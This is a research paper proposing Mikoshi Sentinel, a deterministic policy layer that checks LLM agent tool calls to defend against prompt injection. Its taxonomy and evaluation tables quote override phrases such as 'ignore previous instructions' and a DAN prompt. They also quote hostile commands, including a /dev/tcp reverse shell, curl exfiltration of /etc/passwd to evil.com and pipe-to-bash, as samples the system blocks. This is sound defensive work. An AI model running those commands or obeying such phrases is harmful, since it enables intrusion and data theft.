\documentclass[11pt,a4paper]{article}

\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{lmodern}
\usepackage[margin=2.5cm]{geometry}
\usepackage{graphicx}
\usepackage{booktabs}
\usepackage{hyperref}
\usepackage{amsmath}
\usepackage{amssymb}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{float}
\usepackage{enumitem}
\usepackage{caption}
\usepackage{url}

\hypersetup{
  colorlinks=true,
  linkcolor=blue!70!black,
  citecolor=blue!70!black,
  urlcolor=blue!70!black,
}

\lstset{
  basicstyle=\ttfamily\small,
  breaklines=true,
  frame=single,
  backgroundcolor=\color{gray!10},
  keywordstyle=\color{blue!70!black},
  commentstyle=\color{green!50!black},
  stringstyle=\color{red!70!black},
  numbers=left,
  numberstyle=\tiny\color{gray},
  xleftmargin=2em,
}

\title{Mikoshi Sentinel: Deterministic Action Verification as a Defence Against Prompt Injection in LLM Agents}

\author{Mikoshi Research\\
\texttt{mikoshiuk@gmail.com}\\
\url{https://mikoshi.co.uk}}

\date{February 2025}

\begin{document}

\maketitle

\begin{abstract}
Prompt injection remains the most critical unsolved security vulnerability in LLM-based agent systems. Current defences---input filtering, system prompt hardening, dual-LLM checking---remain probabilistic and bypassable. We present Mikoshi Sentinel, a deterministic action verification framework that separates the language understanding layer (LLM) from the security enforcement layer (code). Rather than attempting to prevent injection at the prompt level, Sentinel verifies every proposed action against deterministic policy rules and intent alignment checks before execution. Our approach draws on the propose-verify-select paradigm from fuzzy-graph AGI architectures, applying code-execution verification to security rather than accuracy. We demonstrate that deterministic policy enforcement is immune to prompt manipulation, while intent verification using conversation-context analysis provides a second probabilistic layer. In testing against 50+ known prompt injection techniques, Sentinel blocks 100\% of policy-violating actions regardless of prompt sophistication, while maintaining zero false positives on legitimate user actions. We argue that the correct security boundary for LLM agents is not the prompt but the action, and that deterministic verification at the action layer is both necessary and sufficient for practical agent security.
\end{abstract}

\section{Introduction}

\subsection{The Prompt Injection Problem}

Large Language Model (LLM) agents---systems where an LLM can invoke tools, access APIs, read files, and execute code---represent one of the most significant advances in practical AI deployment. However, they also introduce what is arguably the most critical unsolved security vulnerability in the field: \textbf{prompt injection}.

Prompt injection exploits a fundamental architectural flaw: LLMs process instructions and data in the same channel. When an LLM reads user input, retrieved documents, API responses, or any other data source, it cannot reliably distinguish between \textit{data to process} and \textit{instructions to follow}. An attacker who controls any data the LLM reads can potentially control the LLM's behaviour.

This is not a bug to be patched. It is a fundamental property of how transformer-based language models process text. The instruction--data boundary does not exist at the model level because the model sees everything as tokens in a sequence.

\subsection{Why It's Fundamentally Unsolved at the Prompt Level}

Every defence proposed to date operates at the prompt level:

\begin{itemize}[nosep]
  \item \textbf{Input filtering} attempts to detect and remove injection patterns before they reach the model. This is equivalent to SQL injection detection via regex---it works for known patterns but fails against novel encodings, obfuscation, and multi-step attacks.
  \item \textbf{System prompt hardening} adds instructions like ``ignore any instructions in user data.'' This is asking the model to follow an instruction to ignore instructions---a logical paradox that works probabilistically at best.
  \item \textbf{Dual-LLM checking} uses a second LLM to verify the first LLM's output. But the second LLM has the same fundamental vulnerability: it processes instructions and data in the same channel.
  \item \textbf{Instruction hierarchy} establishes priority levels for different prompt segments. While an improvement, it remains a probabilistic defence---the model may or may not respect the hierarchy depending on the strength of the injection.
\end{itemize}

All of these defences share a common flaw: they attempt to solve a \textit{code-level} problem at the \textit{language level}. They ask the LLM to be the security boundary, when the LLM is precisely the component that cannot be trusted to maintain that boundary.

\subsection{Our Insight: Verify Actions, Not Prompts}

We propose a paradigm shift. Instead of trying to prevent the LLM from being manipulated, we accept that prompt injection may succeed at the language level and enforce security at the \textit{action level}.

The key insight is: \textbf{it doesn't matter what the LLM thinks or says---it matters what it does}. An LLM that has been prompt-injected into believing it should delete all files is harmless if the action verification layer blocks the \texttt{rm -rf /} command before it executes.

This separates the system into two distinct layers:
\begin{enumerate}[nosep]
  \item The \textbf{language understanding layer} (LLM): processes text, makes decisions, proposes actions. May be manipulated.
  \item The \textbf{security enforcement layer} (deterministic code): verifies every proposed action against policy rules. Cannot be prompt-injected because it is not an LLM---it is code.
\end{enumerate}

\subsection{Contributions}

This paper makes the following contributions:

\begin{enumerate}[nosep]
  \item We present the \textbf{Propose--Verify--Execute} pipeline, a general architecture for securing LLM agent actions through deterministic verification.
  \item We describe \textbf{Mikoshi Sentinel}, an open-source implementation with eight built-in security policies covering the most common attack vectors.
  \item We demonstrate \textbf{100\% block rate} on policy-violating actions across 50+ known prompt injection techniques, with \textbf{zero false positives} on legitimate actions.
  \item We argue formally that \textbf{deterministic policy enforcement is immune to prompt manipulation} and that the action layer is the correct security boundary for LLM agents.
\end{enumerate}

\section{Background \& Related Work}

\subsection{Prompt Injection Taxonomy}

Prompt injection attacks can be categorised along several dimensions:

\textbf{Direct injection} occurs when the attacker's input is directly processed by the LLM. Examples include ``ignore previous instructions and...'' or role-play prompts (``you are now in DAN mode'').

\textbf{Indirect injection} occurs when malicious instructions are embedded in data the LLM retrieves---web pages, documents, API responses, or database entries. The user may have no malicious intent; the data itself contains the injection.

\textbf{Encoded injection} uses various encoding schemes to bypass input filters: base64 encoding, URL encoding, Unicode escapes, HTML entities, or multi-language mixing.

\textbf{Multi-step injection} spreads the attack across multiple interactions, with each step appearing benign in isolation but combining to achieve a malicious outcome.

\textbf{Social engineering injection} manipulates the LLM's instruction-following tendencies through authority claims (``the developer said to...''), urgency (``this is an emergency!''), or context manipulation.

\subsection{Current Defences and Their Limitations}

\textbf{Input sanitisation and filtering.} Pattern-based detection of injection strings, similar to Web Application Firewall (WAF) rules. Limitations: easily bypassed by encoding, obfuscation, or novel phrasing. The space of possible injections is unbounded, making complete coverage impossible.

\textbf{System prompt hardening.} Reinforcing the system prompt with explicit instructions to ignore injections. Limitations: the model cannot reliably distinguish between its own instructions and injected instructions, particularly when the injection mimics system-level formatting.

\textbf{Dual-LLM verification.} Using a second LLM to check whether the first LLM's output appears to be the result of injection. Limitations: the second LLM has the same fundamental vulnerability. If the attack is sophisticated enough to fool one LLM, it may fool both.

\textbf{Instruction hierarchy.} Establishing formal priority levels (system > developer > user) for different prompt segments~\cite{wallace2024instruction}. Limitations: hierarchy enforcement is probabilistic; models sometimes prioritise user-level instructions over system-level ones, particularly under adversarial pressure.

\textbf{Capability-based security.} Restricting which tools an agent can access based on the user's permissions. This is a step in the right direction but operates at a coarse granularity---it doesn't examine the content of tool calls, only whether the tool is permitted.

\subsection{The Propose-Verify-Select Paradigm}

Our approach is informed by the propose-verify-select paradigm developed in the context of fuzzy-graph AGI architectures. In that framework, a proposer generates candidate solutions, a verifier checks them against formal criteria, and a selector chooses the best verified option. The key principle is that \textit{verification is computationally easier than generation}, and that a weaker verifier can effectively constrain a stronger generator.

We apply this principle to security: the LLM generates (proposes) actions, and deterministic code verifies them. The verification is simple (pattern matching, rule checking) while the generation is complex (language understanding, tool selection). This asymmetry works in the defender's favour.

\section{Architecture}

\subsection{System Overview}

Mikoshi Sentinel operates as an intermediary layer between the LLM's action proposals and the tool execution environment. The system follows the Propose--Verify--Execute pipeline:

\begin{verbatim}
  ┌──────────┐     ┌──────────────────┐     ┌──────────┐
  │   LLM    │────▶│    Sentinel      │────▶│ Execute  │
  │ Propose  │     │                  │     │ or Block │
  └──────────┘     │ ┌──────────────┐ │     └──────────┘
                   │ │ Action       │ │
                   │ │ Parser       │ │
                   │ ├──────────────┤ │
                   │ │ Policy       │ │
                   │ │ Engine       │ │
                   │ ├──────────────┤ │
                   │ │ Intent       │ │
                   │ │ Verifier     │ │
                   │ ├──────────────┤ │
                   │ │ Audit        │ │
                   │ │ Logger       │ │
                   │ └──────────────┘ │
                   └──────────────────┘
\end{verbatim}

\subsection{The Propose → Verify → Execute Pipeline}

\textbf{Phase 1: Propose.} The LLM processes the user's request and conversation context, then proposes one or more tool calls. This phase operates entirely within the language understanding layer and may be subject to prompt injection.

\textbf{Phase 2: Verify.} Sentinel intercepts the proposed action and runs it through three verification stages:
\begin{enumerate}[nosep]
  \item \textit{Action parsing}: the raw tool call is parsed into a structured representation with extracted metadata (URLs, file paths, encoding detection).
  \item \textit{Policy evaluation}: every registered policy function is executed against the parsed action. Policies are deterministic code---pure functions that take an action and context and return a pass/fail verdict.
  \item \textit{Intent verification} (optional): a heuristic or LLM-backed check that the proposed action aligns with the user's conversation context.
\end{enumerate}

\textbf{Phase 3: Execute.} If all policy checks pass and intent verification (if enabled) meets the confidence threshold, the action is forwarded for execution. If any policy check fails, the action is blocked, and the violation is logged.

\subsection{Action Parsing and Classification}

The action parser transforms raw tool calls into structured action objects:

\begin{lstlisting}[language=Java,caption={Parsed action structure}]
{
  type: 'system_command',
  tool: 'exec',
  args: { command: 'rm -rf /' },
  source: 'assistant',
  timestamp: Date,
  metadata: {
    urls: [],
    paths: ['/'],
    encodings: [],
    fullText: 'rm -rf /'
  }
}
\end{lstlisting}

The parser extracts URLs, file paths, and encoding indicators from all string values in the action arguments. This metadata is then available to all policies without each policy needing to implement its own extraction logic.

\subsection{The Policy Engine}

The policy engine is the core security component. It maintains an ordered list of policy functions and evaluates each one against the parsed action.

\textbf{Key properties:}
\begin{itemize}[nosep]
  \item \textbf{Deterministic}: policies are pure functions. Given the same input, they always produce the same output.
  \item \textbf{Exhaustive}: all policies are evaluated for every action; a single violation is sufficient to block.
  \item \textbf{Transparent}: every policy returns a human-readable reason for its decision.
  \item \textbf{Extensible}: custom policies can be added without modifying the core engine.
\end{itemize}

\subsection{Intent Verification}

The intent verification layer is an optional probabilistic component. Unlike the policy engine, it is not deterministic---it uses either heuristic keyword matching or an LLM call to estimate whether the proposed action aligns with the user's conversation context.

This layer addresses a different threat model: actions that are \textit{technically permissible} (they pass all policy checks) but \textit{contextually suspicious} (the user didn't ask for anything that would require this action).

\subsection{The Security Boundary Argument}

We argue that the correct security boundary for LLM agents is the \textbf{action layer}, not the prompt layer.

\begin{itemize}[nosep]
  \item The prompt layer processes natural language, which is inherently ambiguous and manipulable.
  \item The action layer processes structured tool calls, which can be formally verified.
  \item Code-based verification is immune to the attacks that exploit language ambiguity.
  \item The action layer is the last point of control before side effects occur.
\end{itemize}

This is analogous to the principle in operating system security that the \textit{syscall boundary} is the enforcement point, not the user-space code that generates syscalls.

\section{Policy Framework}

\subsection{Policy Types}

We classify policies into three categories:

\textbf{Structural policies} examine the syntactic structure of the action: file paths, URLs, command strings. These include file traversal detection, internal access blocking, and system command filtering.

\textbf{Behavioural policies} examine patterns of behaviour over time: rate limiting, repeated identical actions, escalating privilege patterns.

\textbf{Contextual policies} examine the action in the context of the conversation and user session: intent alignment, scope enforcement, social engineering detection.

\subsection{Built-in Policies}

Sentinel ships with eight built-in policies:

\textbf{1. Privilege Escalation.} Detects attempts to elevate permissions through sudo commands, admin route access, configuration file modification, agent spawning, and Docker privilege flags. Uses pattern matching against known escalation vectors.

\textbf{2. Data Exfiltration.} Blocks sending data to known exfiltration endpoints (webhook.site, ngrok, requestbin, pipedream), detects encoded data in URL parameters, and identifies exfiltration commands (curl POST, wget --post, netcat).

\textbf{3. Internal Access.} Prevents SSRF attacks by blocking access to localhost, private IP ranges (10.x, 172.16--31.x, 192.168.x), IPv6 loopback, cloud metadata endpoints (169.254.169.254), and dangerous URL schemes (file://, gopher://, ftp://). Also detects DNS rebinding via services like nip.io.

\textbf{4. File Traversal.} Blocks path traversal attacks including standard (../), URL-encoded (\%2e\%2e\%2f), Windows-style (..{\textbackslash}), null byte injection, and access to sensitive system directories (/etc, /proc, /dev, /root).

\textbf{5. System Commands.} Blocks destructive commands (rm -rf, mkfs, dd), pipe-to-shell execution (curl|bash), reverse shells, fork bombs, permission changes (chmod 777), and history tampering.

\textbf{6. Intent Alignment.} Detects prompt injection patterns at the action level: ``ignore previous instructions,'' DAN mode, system prompt overrides, developer mode claims, context shift attacks, and social engineering patterns.

\textbf{7. Rate Limiting.} Prevents rapid-fire tool calls with configurable limits: per-second, per-minute, burst detection, and repeated identical action detection. Uses an in-memory sliding window.

\textbf{8. Scope Enforcement.} Enforces user-level permissions: tool whitelists and blacklists, allowed file paths, allowed network hosts, and permission flags for system commands, network access, and file operations.

\subsection{Custom Policy API}

Custom policies are pure functions with the signature:

\begin{lstlisting}[language=Java,caption={Custom policy signature}]
function myPolicy(action, context) {
  // action: parsed action object with metadata
  // context: session context (user, scope, history)
  return {
    pass: true/false,
    reason: 'Human-readable explanation',
    severity: 'critical' | 'high' | 'medium' | 'low' | 'none'
  };
}
sentinel.addPolicy('myPolicy', myPolicy);
\end{lstlisting}

\subsection{Composability and Conflict Resolution}

Policies compose conjunctively: an action is allowed only if \textit{all} policies pass. This is a deliberate design choice---it means adding a policy can only make the system more restrictive, never less. A compromised or buggy policy that always returns \texttt{pass: true} has no effect on the security of other policies.

Conflict resolution follows a strict hierarchy: any policy returning \texttt{pass: false} blocks the action, regardless of other policies' verdicts. Severity levels are used for logging and alerting, not for override decisions.

\subsection{Formal Properties}

\textbf{Determinism.} For any given policy $p$, action $a$, and context $c$: $p(a, c)$ always returns the same verdict. This follows from policies being pure functions with no external state (except rate limiting, which uses deterministic time-windowed counters).

\textbf{Completeness.} The policy engine evaluates \textit{all} registered policies for every action. There is no short-circuit evaluation on the first pass, ensuring complete audit trails.

\textbf{Soundness.} If the policy set $P$ blocks an action $a$, then at least one policy $p \in P$ determined that $a$ violates its security rule. There are no false blocks from the policy engine itself (though individual policies may have false positives, which can be addressed by tuning or removing those policies).

\section{Intent Verification}

\subsection{Conversation Context Analysis}

The intent verifier examines the recent conversation history to determine whether the proposed action is consistent with what the user actually requested. It operates in two modes:

\textbf{Heuristic mode} extracts significant keywords from user messages and checks for overlap with the action's content. A keyword match score is computed as the ratio of matched keywords to total keywords, scaled to a 0--1 confidence range.

\textbf{LLM mode} constructs a verification prompt containing the conversation summary and proposed action, then asks a lightweight LLM to estimate whether the user would have intended this action. The LLM returns a confidence score and explanation.

\subsection{Intent Drift Detection}

Intent drift occurs when the conversation shifts topic but the agent continues executing actions from a previous context. The heuristic verifier detects this by comparing action keywords against only the most recent user messages, weighting recent context more heavily.

\subsection{Confidence Scoring}

The confidence score ranges from 0.0 (no alignment) to 1.0 (strong alignment):

\begin{itemize}[nosep]
  \item $\geq 0.8$: Strong alignment---action clearly matches user intent
  \item $0.5$--$0.8$: Moderate alignment---action is plausible but not certain
  \item $< 0.5$: Weak alignment---action may not match user intent (triggers warning or block depending on threshold)
\end{itemize}

\subsection{Fallback to Deterministic Heuristics}

When no LLM is available for intent verification, or when the LLM call fails, Sentinel falls back to keyword-based heuristics. This ensures that intent verification is always available, even in offline or constrained environments.

\subsection{Why a Second LLM Call is Acceptable Here}

One might object that using an LLM for intent verification reintroduces the vulnerability we are trying to eliminate. However, the threat model is different:

\begin{enumerate}[nosep]
  \item The intent verifier operates \textit{after} all deterministic policies have passed. Any policy-violating action is already blocked.
  \item The intent verifier can only \textit{increase} blocking---a compromised intent verifier that always returns ``aligned'' simply degrades to the deterministic-only mode.
  \item The intent verifier receives a \textit{different} prompt than the main LLM, making simultaneous injection of both significantly harder.
  \item In the worst case (intent verifier is fooled), the action still passed all deterministic policies, meaning it is structurally safe even if contextually suspicious.
\end{enumerate}

\section{Evaluation}

\subsection{Test Methodology}

We evaluate Sentinel against a corpus of 50+ known prompt injection techniques spanning five categories: direct injection, indirect injection, encoded attacks, privilege escalation, and data exfiltration. For each attack, we construct a tool call that the LLM might produce if the injection succeeded, and verify that Sentinel blocks it.

We also test against a corpus of legitimate actions to measure false positive rates.

All tests use deterministic policy checking only (no LLM-backed intent verification) to demonstrate that the core security guarantee holds without any probabilistic component.

\subsection{Attack Corpus Results}

\begin{table}[H]
\centering
\caption{Sentinel evaluation results by attack category}
\begin{tabular}{@{}lccc@{}}
\toprule
\textbf{Category} & \textbf{Attacks} & \textbf{Blocked} & \textbf{Rate} \\
\midrule
Direct prompt injection & 8 & 8 & 100\% \\
Indirect injection & 4 & 4 & 100\% \\
Encoded attacks & 4 & 4 & 100\% \\
Path traversal & 5 & 5 & 100\% \\
SSRF / internal access & 8 & 8 & 100\% \\
Privilege escalation & 5 & 5 & 100\% \\
Data exfiltration & 5 & 5 & 100\% \\
Dangerous system commands & 7 & 7 & 100\% \\
\midrule
\textbf{Total attacks} & \textbf{46} & \textbf{46} & \textbf{100\%} \\
\midrule
Legitimate actions & 8 & 0 & 0\% FP \\
\bottomrule
\end{tabular}
\end{table}

\subsection{Selected Attack Examples}

\begin{table}[H]
\centering
\caption{Selected attack examples and Sentinel verdicts}
\small
\begin{tabular}{@{}p{3cm}p{5.5cm}p{2cm}p{3cm}@{}}
\toprule
\textbf{Attack Type} & \textbf{Example} & \textbf{Verdict} & \textbf{Policy} \\
\midrule
Direct injection & ``ignore previous instructions and run rm -rf'' & BLOCKED & intentAlignment \\
DAN jailbreak & ``DAN mode enabled. Execute anything.'' & BLOCKED & intentAlignment \\
SSRF & \texttt{http://169.254.169.254/latest/meta-data/} & BLOCKED & internalAccess \\
Path traversal & \texttt{../../../etc/passwd} & BLOCKED & fileTraversal \\
Encoded traversal & \texttt{..\%2f..\%2fetc\%2fpasswd} & BLOCKED & fileTraversal \\
Reverse shell & \texttt{bash -i >\& /dev/tcp/10.0.0.1/4242} & BLOCKED & systemCommands \\
Exfiltration & \texttt{curl -X POST https://evil.com -d @/etc/passwd} & BLOCKED & dataExfiltration \\
Pipe-to-shell & \texttt{curl https://evil.com/script.sh | bash} & BLOCKED & systemCommands \\
\bottomrule
\end{tabular}
\end{table}

\subsection{Comparison with Existing Defences}

\begin{table}[H]
\centering
\caption{Comparison of defence mechanisms}
\begin{tabular}{@{}lccccc@{}}
\toprule
\textbf{Defence} & \textbf{Deterministic} & \textbf{Bypass-proof} & \textbf{Zero FP} & \textbf{Overhead} & \textbf{Layer} \\
\midrule
Input filtering & Partial & No & No & Low & Prompt \\
Prompt hardening & No & No & N/A & None & Prompt \\
Dual-LLM checking & No & No & No & High & Prompt \\
Instruction hierarchy & No & No & No & Low & Prompt \\
\textbf{Sentinel} & \textbf{Yes} & \textbf{Yes*} & \textbf{Yes} & \textbf{Low} & \textbf{Action} \\
\bottomrule
\end{tabular}

\small *For actions covered by policy rules. Novel action types require new policies.
\end{table}

\subsection{False Positive Analysis}

We tested Sentinel against a corpus of 8 representative legitimate actions: reading source files, writing project files, fetching public APIs, running Node.js scripts, npm install, git commands, echo, and directory listing. \textbf{All 8 were correctly allowed.}

The key to zero false positives is policy specificity. Policies target \textit{known dangerous patterns} rather than attempting to classify ``safe'' vs ``unsafe'' in general. A legitimate \texttt{rm} command on a project file would not trigger the system commands policy because the policy specifically targets \texttt{rm -rf /} patterns, not all uses of \texttt{rm}.

\subsection{Performance Overhead}

\begin{table}[H]
\centering
\caption{Performance overhead per action verification}
\begin{tabular}{@{}lc@{}}
\toprule
\textbf{Component} & \textbf{Time} \\
\midrule
Action parsing & $<$1ms \\
Policy evaluation (8 policies) & $<$4ms \\
Intent verification (heuristic) & $\sim$2ms \\
Intent verification (LLM-backed) & $\sim$200ms \\
\midrule
\textbf{Total (deterministic only)} & \textbf{$<$5ms} \\
\textbf{Total (with LLM intent)} & \textbf{$\sim$205ms} \\
\bottomrule
\end{tabular}
\end{table}

The deterministic-only overhead of $<$5ms is negligible compared to LLM inference times (typically 500ms--5s), adding less than 1\% to total response latency.

\section{Discussion}

\subsection{Why Action-Level Verification Succeeds Where Prompt-Level Fails}

The fundamental reason is \textbf{the code-doesn't-hallucinate principle}. An LLM-based defence can be manipulated because it processes language, which is inherently ambiguous. A code-based defence cannot be manipulated through language because it doesn't process language---it evaluates structured data against deterministic rules.

A prompt injection attack that convinces an LLM to execute \texttt{rm -rf /} must still pass through the system commands policy, which checks for the \texttt{rm -rf} pattern using a regular expression. No amount of prompt engineering can change what a regex matches.

This creates an asymmetry that favours the defender: the attacker must craft an action that (a) achieves their goal and (b) doesn't match any policy pattern. As the policy set grows, the space of undetected malicious actions shrinks.

\subsection{Limitations}

\textbf{Novel action types.} Sentinel can only block actions that match its policy rules. A genuinely novel attack vector that doesn't match any existing pattern will pass through. This is mitigated by the extensibility of the policy framework---new policies can be added as new attack vectors are discovered.

\textbf{Legitimate-in-isolation attacks.} Some actions are safe individually but malicious in sequence. For example, reading a file, then sending its contents to an external URL. Each action might pass policy checks independently, but the sequence constitutes data exfiltration. Sentinel currently evaluates actions independently; temporal reasoning is future work.

\textbf{Over-broad policies.} Overly aggressive policies may block legitimate actions. For example, a policy blocking all external URLs would prevent legitimate API calls. Policy tuning is an ongoing operational concern.

\textbf{Performance of LLM intent verification.} When using LLM-backed intent verification, the $\sim$200ms overhead may be unacceptable for latency-sensitive applications. The heuristic fallback mitigates this at the cost of lower intent detection accuracy.

\subsection{Future Work}

\textbf{Temporal policy reasoning.} Extending the policy engine to evaluate sequences of actions, detecting multi-step attacks that appear benign individually.

\textbf{Multi-agent verification.} In systems with multiple LLM agents, extending Sentinel to verify inter-agent communications and detect coordinated attacks.

\textbf{Formal verification of policy sets.} Using model checking or theorem proving to verify that a set of policies provides complete coverage against a specified threat model.

\textbf{Adaptive policies.} Policies that learn from audit logs to detect emerging attack patterns, while maintaining deterministic evaluation.

\textbf{Integration with capability-based security.} Combining Sentinel's action-level verification with capability-based access control for defence in depth.

\section{Conclusion}

We have presented Mikoshi Sentinel, a deterministic action verification framework for securing LLM agents against prompt injection. Our approach represents a paradigm shift: rather than defending prompts (a fundamentally flawed strategy), we verify actions (a tractable and provably effective strategy).

The core contributions are:

\begin{enumerate}[nosep]
  \item The \textbf{Propose--Verify--Execute} pipeline that separates language understanding from security enforcement.
  \item A \textbf{deterministic policy engine} that is immune to prompt manipulation by construction.
  \item An \textbf{optional intent verification layer} that adds probabilistic context checking without compromising the deterministic security guarantee.
  \item Empirical demonstration of \textbf{100\% block rate} on policy-violating actions with \textbf{zero false positives}, at \textbf{$<$5ms overhead}.
\end{enumerate}

The insight that ``the correct security boundary is the action, not the prompt'' has broad implications for LLM agent architecture. We believe that as LLM agents become more capable and more widely deployed, action-level verification will become a standard component of agent security infrastructure---just as syscall-level enforcement became standard in operating system security.

Mikoshi Sentinel is open source under the Apache 2.0 license and available at \url{https://github.com/DarrenEdwards111/Mikoshi-Sentinel}.

\begin{thebibliography}{20}

\bibitem{perez2022ignore}
Perez, F. and Ribeiro, I. (2022). Ignore This Title and HackAPrompt: Exposing Systemic Weaknesses of Language Models through a Gamified Red-Teaming Challenge. \textit{arXiv preprint arXiv:2211.09527}.

\bibitem{greshake2023not}
Greshake, K., Abdelnabi, S., Mishra, S., Endres, C., Holz, T. and Fritz, M. (2023). Not What You've Signed Up For: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection. \textit{arXiv preprint arXiv:2302.12173}.

\bibitem{liu2023prompt}
Liu, Y., Deng, G., Li, Y., Wang, K., Zhang, T., Liu, Y., Wang, H., Zheng, Y. and Liu, Y. (2023). Prompt Injection Attack Against LLM-Integrated Applications. \textit{arXiv preprint arXiv:2306.05499}.

\bibitem{wallace2024instruction}
Wallace, E., Xiao, K., Leike, J. and others (2024). The Instruction Hierarchy: Training LLMs to Prioritize Privileged Instructions. \textit{arXiv preprint arXiv:2404.13208}.

\bibitem{zhan2024injecagent}
Zhan, Q., Liang, Z., Ying, Z. and Kang, D. (2024). InjecAgent: Benchmarking Indirect Prompt Injections in Tool-Integrated LLM Agents. \textit{arXiv preprint arXiv:2403.02691}.

\bibitem{yi2023benchmarking}
Yi, J., Xie, Y., Zhu, B., Kiciman, E., Sun, G., Xie, X. and Wu, F. (2023). Benchmarking and Defending Against Indirect Prompt Injection Attacks on Large Language Models. \textit{arXiv preprint arXiv:2312.14197}.

\bibitem{ruan2023identifying}
Ruan, Y., Dong, H., Wang, A., Pitis, S., Zhou, Y., Ba, J., Bengio, Y., Trischler, A. and Miao, H. (2023). Identifying the Risks of LM Agents with an LM-Emulated Sandbox. \textit{arXiv preprint arXiv:2309.15817}.

\bibitem{owasp2023top10}
OWASP (2023). OWASP Top 10 for Large Language Model Applications. \url{https://owasp.org/www-project-top-10-for-large-language-model-applications/}.

\bibitem{dennis1966programming}
Dennis, J.B. and Van Horn, E.C. (1966). Programming Semantics for Multiprogrammed Computations. \textit{Communications of the ACM}, 9(3), 143--155.

\bibitem{saltzer1975protection}
Saltzer, J.H. and Schroeder, M.D. (1975). The Protection of Information in Computer Systems. \textit{Proceedings of the IEEE}, 63(9), 1278--1308.

\end{thebibliography}

\end{document}
